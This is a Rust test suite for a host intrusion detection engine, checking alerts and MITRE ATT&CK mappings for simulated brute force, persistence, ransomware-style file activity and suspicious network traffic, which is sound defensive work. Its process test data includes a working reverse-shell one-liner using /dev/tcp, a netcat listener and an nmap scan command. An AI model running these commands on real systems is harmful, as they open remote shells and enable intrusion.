//! Attack Simulation Lab — Phase 9 Security Validation
//!
//! 14 harmless scenarios that construct synthetic NormalizedEvents and verify
//! the detection engine fires the expected alerts with correct rule IDs and
//! MITRE ATT&CK technique mappings.

use chrono::Utc;
use os_defender_core::detection::{default_ruleset, DetectionEngine};
use os_defender_core::events::*;

// ─── helpers ───────────────────────────────────────────────────────

fn engine() -> DetectionEngine {
    DetectionEngine::new(default_ruleset())
}

fn auth_event(user: &str, addr: &str, action: AuthAction) -> NormalizedEvent {
    NormalizedEvent::new("sim".into(), OsType::Linux, EventType::Authentication, Severity::Medium)
        .with_auth(AuthContext {
            action,
            username: user.into(),
            source_addr: Some(addr.into()),
            method: Some("password".into()),
            service: Some("sshd".into()),
            session_id: None,
        })
}

fn proc_event(name: &str, exe: &str, cmdline: &str, pid: u32, ppid: u32) -> NormalizedEvent {
    NormalizedEvent::new("sim".into(), OsType::Linux, EventType::Process, Severity::Info)
        .with_process(ProcessContext {
            pid,
            ppid: Some(ppid),
            name: name.into(),
            exe: Some(exe.into()),
            cmdline: Some(cmdline.into()),
            uid: Some(1000),
            username: Some("attacker".into()),
            start_time: None,
            children_pids: vec![],
        })
}

fn file_event(path: &str, action: FileAction) -> NormalizedEvent {
    NormalizedEvent::new("sim".into(), OsType::Linux, EventType::File, Severity::Info)
        .with_file(FileContext {
            path: path.into(),
            action,
            sha256: None,
            size_bytes: None,
            owner_uid: None,
            permissions: None,
        })
}

fn net_event(dir: NetDirection, remote_addr: &str, remote_port: u16, proc_name: &str) -> NormalizedEvent {
    NormalizedEvent::new("sim".into(), OsType::Linux, EventType::Network, Severity::Info)
        .with_network(NetworkContext {
            protocol: NetworkProtocol::Tcp,
            direction: dir,
            local_addr: "192.168.1.100".into(),
            local_port: 54321,
            remote_addr: Some(remote_addr.into()),
            remote_port: Some(remote_port),
            state: Some("ESTABLISHED".into()),
            pid: Some(9999),
            process_name: Some(proc_name.into()),
            bytes_sent: None,
            bytes_received: None,
        })
}

fn has_mitre(alerts: &[os_defender_core::detection::Alert], technique: &str) -> bool {
    alerts.iter().any(|a| a.mitre_techniques.contains(&technique.to_string()))
}

fn has_rule(alerts: &[os_defender_core::detection::Alert], rule_id: &str) -> bool {
    alerts.iter().any(|a| a.rule_id.as_deref() == Some(rule_id))
}

// ─── T1110 — Brute Force ──────────────────────────────────────────

#[test]
fn t1110_brute_force_ssh() {
    let mut eng = engine();
    let attacker_ip = "203.0.113.42";

    for i in 0..4 {
        let alerts = eng.process_event(&auth_event("root", attacker_ip, AuthAction::Failed));
        assert!(alerts.is_empty(), "should not alert before threshold (attempt {})", i + 1);
    }
    let alerts = eng.process_event(&auth_event("root", attacker_ip, AuthAction::Failed));
    assert!(!alerts.is_empty(), "should alert at threshold");
    assert!(has_rule(&alerts, "R001-brute-force"));
    assert!(has_mitre(&alerts, "T1110"));
    assert!(alerts[0].severity >= Severity::Medium);
}

#[test]
fn t1110_brute_force_multiple_users_isolated() {
    let mut eng = engine();
    let ip = "198.51.100.1";

    eng.process_event(&auth_event("admin", ip, AuthAction::Failed));
    eng.process_event(&auth_event("admin", ip, AuthAction::Failed));
    eng.process_event(&auth_event("root", ip, AuthAction::Failed));
    eng.process_event(&auth_event("root", ip, AuthAction::Failed));

    // Neither user has reached the threshold of 5
    let alerts_admin = eng.process_event(&auth_event("admin", ip, AuthAction::Failed));
    let alerts_root = eng.process_event(&auth_event("root", ip, AuthAction::Failed));
    assert!(alerts_admin.is_empty(), "admin at 3, below threshold");
    assert!(alerts_root.is_empty(), "root at 3, below threshold");
}

// ─── T1059.004 — Reverse Shell ────────────────────────────────────

#[test]
fn t1059_004_reverse_shell() {
    let mut eng = engine();
    let event = proc_event(
        "bash",
        "/usr/bin/bash",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        4567, 100,
    );
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "reverse shell should trigger alert");
    assert!(has_rule(&alerts, "R002-suspicious-process"));
    assert!(has_mitre(&alerts, "T1059.004"));
    assert!(alerts[0].severity >= Severity::High);
}

// ─── T1059 — Crypto Miner (network recon tool) ───────────────────

#[test]
fn t1059_network_recon_nmap() {
    let mut eng = engine();
    let event = proc_event(
        "nmap",
        "/usr/bin/nmap",
        "nmap -sS -p- 192.168.1.0/24",
        5555, 100,
    );
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "nmap execution should trigger alert");
    assert!(has_rule(&alerts, "R002-suspicious-process"));
    assert!(has_mitre(&alerts, "T1059"));
}

// ─── T1565.001 — /etc/shadow Tampering ───────────────────────────

#[test]
fn t1565_001_shadow_tampering() {
    let mut eng = engine();
    let event = file_event("/etc/shadow", FileAction::Modify);
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "/etc/shadow modification should trigger");

    // Could match R003 (file tampering) or R005 (persistence), both are valid
    let any_match = has_rule(&alerts, "R003-file-tampering") || has_rule(&alerts, "R005-persistence-change");
    assert!(any_match, "should match file tampering or persistence rule");
    assert!(alerts.iter().any(|a| a.severity >= Severity::High));
}

// ─── T1486 — Ransomware: Rapid File Modifications ────────────────

#[test]
fn t1486_ransomware_rapid_modifications() {
    let mut eng = engine();
    let now = Utc::now();

    // R003 file_tampering has rapid_threshold=20, but we use non-sensitive paths
    // to avoid hitting the sensitive-file check first
    for i in 0..19 {
        let mut event = file_event(&format!("/opt/data/document_{i}.pdf"), FileAction::Modify);
        event.timestamp = now;
        let _ = eng.process_event(&event);
    }
    let mut final_event = file_event("/opt/data/document_19.pdf", FileAction::Modify);
    final_event.timestamp = now;
    let alerts = eng.process_event(&final_event);
    assert!(!alerts.is_empty(), "rapid bulk modifications should trigger");
    assert!(has_mitre(&alerts, "T1486"));
    assert!(alerts.iter().any(|a| a.severity == Severity::Critical));
}

// ─── T1486 — Ransomware: Known Extension Rename ──────────────────
// Note: This tests the R003 rapid rename path. The R006 ransomware rule
// is only in the default_ruleset if it was added; extension detection
// happens via the file_tampering rapid rename aggregator.

#[test]
fn t1486_rapid_rename_storm() {
    let mut eng = engine();
    let now = Utc::now();

    // Generate enough renames in the same directory to hit the rapid threshold
    for i in 0..19 {
        let mut event = file_event(&format!("/opt/data/file_{i}.txt"), FileAction::Rename);
        event.timestamp = now;
        let _ = eng.process_event(&event);
    }
    let mut final_event = file_event("/opt/data/file_19.txt.encrypted", FileAction::Rename);
    final_event.timestamp = now;
    let alerts = eng.process_event(&final_event);
    assert!(!alerts.is_empty(), "rapid renames should trigger ransomware detection");
    assert!(has_mitre(&alerts, "T1486"));
}

// ─── T1571 — Non-Standard Port (Backdoor) ────────────────────────

#[test]
fn t1571_non_standard_port_4444() {
    let mut eng = engine();
    let event = net_event(
        NetDirection::Outbound,
        "45.33.32.156",  // public IP (scanme.nmap.org)
        4444,
        "suspicious_binary",
    );
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "outbound to port 4444 on public IP should trigger");
    assert!(has_rule(&alerts, "R004-anomalous-network"));
    assert!(has_mitre(&alerts, "T1571"));
    assert!(alerts[0].severity >= Severity::High);
}

// ─── T1053.003 — Cron Persistence ────────────────────────────────

#[test]
fn t1053_003_cron_modification() {
    let mut eng = engine();
    let event = file_event("/var/spool/cron/crontabs/root", FileAction::Modify);
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "crontab modification should trigger");
    assert!(has_rule(&alerts, "R005-persistence-change"));
    assert!(has_mitre(&alerts, "T1053.003"));
    assert!(alerts[0].severity >= Severity::High);
}

// ─── T1543.002 — Systemd Service Persistence ─────────────────────

#[test]
fn t1543_002_systemd_service_creation() {
    let mut eng = engine();
    let event = file_event(
        "/etc/systemd/system/malicious-miner.service",
        FileAction::Create,
    );
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "systemd service creation should trigger");
    // May fire R003 (sensitive /etc/systemd/ path) and/or R005 (persistence pattern)
    let has_persistence = has_rule(&alerts, "R005-persistence-change");
    let has_file_tampering = has_rule(&alerts, "R003-file-tampering");
    assert!(has_persistence || has_file_tampering, "should match persistence or file tampering rule");
    assert!(
        has_mitre(&alerts, "T1543.002") || has_mitre(&alerts, "T1565.001"),
        "should map to T1543.002 or T1565.001",
    );
}

// ─── T1098.004 — SSH Authorized Keys ─────────────────────────────

#[test]
fn t1098_004_authorized_keys_modification() {
    let mut eng = engine();
    let event = file_event("/home/admin/.ssh/authorized_keys", FileAction::Modify);
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "authorized_keys modification should trigger");

    // May fire on R003 (sensitive file) or R005 (persistence) — both valid
    let matched_rule = has_rule(&alerts, "R003-file-tampering")
        || has_rule(&alerts, "R005-persistence-change");
    assert!(matched_rule);

    let matched_technique = has_mitre(&alerts, "T1098.004")
        || has_mitre(&alerts, "T1565.001");
    assert!(matched_technique, "should map to T1098.004 or T1565.001");
    assert!(alerts.iter().any(|a| a.severity >= Severity::High));
}

// ─── T1071 — C2 Beaconing (Uncommon Port to Same IP) ─────────────

#[test]
fn t1071_c2_uncommon_port() {
    let mut eng = engine();
    // Repeated connections to same external IP on non-standard port
    let c2_ip = "198.51.100.77";
    let c2_port = 8888;

    let event = net_event(NetDirection::Outbound, c2_ip, c2_port, "beacon");
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), "outbound to uncommon port on public IP triggers");
    assert!(has_rule(&alerts, "R004-anomalous-network"));
    assert!(has_mitre(&alerts, "T1571"));
}

// ─── T1059 — Recon Tools (suspicious processes) ──────────────────

#[test]
fn t1059_recon_tool_execution() {
    let mut eng = engine();

    // netcat is flagged as a network tool by R002
    let nc_event = proc_event("nc", "/usr/bin/nc", "nc -lvp 9999", 7001, 100);
    let alerts = eng.process_event(&nc_event);
    assert!(!alerts.is_empty(), "netcat execution should trigger");
    assert!(has_rule(&alerts, "R002-suspicious-process"));
    assert!(has_mitre(&alerts, "T1059"));
}

// ─── T1546.004 — Shell RC File Persistence ───────────────────────

#[test]
fn t1546_004_bashrc_modification() {
    let mut eng = engine();
    let event = file_event("/home/victim/.bashrc", FileAction::Modify);
    let alerts = eng.process_event(&event);
    assert!(!alerts.is_empty(), ".bashrc modification should trigger");
    assert!(has_rule(&alerts, "R005-persistence-change"));
    assert!(has_mitre(&alerts, "T1546.004"));
}

// ─── Negative Controls ───────────────────────────────────────────

#[test]
fn benign_ssh_login_no_alert() {
    let mut eng = engine();
    let event = auth_event("admin", "10.0.0.5", AuthAction::Login);
    let alerts = eng.process_event(&event);
    assert!(alerts.is_empty(), "successful login should not trigger brute-force");
}

#[test]
fn benign_process_no_alert() {
    let mut eng = engine();
    let event = proc_event("ls", "/usr/bin/ls", "ls -la /home", 8000, 100);
    let alerts = eng.process_event(&event);
    assert!(alerts.is_empty(), "normal ls should not trigger");
}

#[test]
fn benign_outbound_443_no_alert() {
    let mut eng = engine();
    let event = net_event(NetDirection::Outbound, "1.1.1.1", 443, "curl");
    let alerts = eng.process_event(&event);
    assert!(alerts.is_empty(), "HTTPS to public IP should not trigger");
}

#[test]
fn benign_file_in_tmp_no_alert() {
    let mut eng = engine();
    let event = file_event("/tmp/scratch.txt", FileAction::Create);
    let alerts = eng.process_event(&event);
    assert!(alerts.is_empty(), "creating file in /tmp should not trigger");
}
